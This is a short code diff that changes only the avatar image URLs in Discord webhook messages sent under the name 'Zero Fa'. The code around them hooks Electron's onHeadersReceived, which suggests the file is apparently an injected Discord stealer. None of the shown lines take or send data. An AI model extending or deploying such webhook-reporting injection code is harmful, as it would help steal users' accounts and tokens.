@@ -194,7 +194,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         var params = {
             username: "Zero Fa",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
             embeds: [
                 {
                     "color": 2560,
@@ -246,7 +246,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             var params = {
                 username: "Zero Fa",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
                 embeds: [
                     {
                         "color": 2560,
@@ -304,7 +304,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         var params = {
             username: "Zero fa",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
             embeds: [
                 {
                     "color": 2560,
